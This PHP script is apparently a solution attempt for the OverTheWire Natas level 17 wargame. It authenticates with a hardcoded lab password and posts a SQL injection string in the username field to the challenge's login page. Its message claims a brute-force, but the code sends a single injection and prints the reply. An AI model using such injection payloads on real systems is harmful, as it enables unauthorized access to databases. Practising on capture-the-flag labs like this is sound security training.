<?php

$headers = array("Authorization: Basic ". base64_encode("natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw"));
$url = "http://natas17.natas.labs.overthewire.org/";

$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_RETURNTRANSFER,true);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
curl_setopt($curl, CURLOPT_COOKIEJAR, 'cookies.txt');
curl_setopt($curl, CURLOPT_COOKIEFILE, 'cookies.txt');
$out = curl_exec($curl);

echo "Brute-force password for natas17:...\n";
$url = "http://natas17.natas.labs.overthewire.org/index.php?debug";
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, 1);
curl_setopt($curl, CURLOPT_COOKIEJAR, 'cookies.txt');
curl_setopt($curl, CURLOPT_COOKIEFILE, 'cookies.txt');
curl_setopt($curl, CURLOPT_POSTFIELDS, "username=natas18\"-- SELECT * FROM users; SELECT * from users where 1 OR user =\"");
$out = curl_exec($curl);
echo $out;
curl_close($curl);

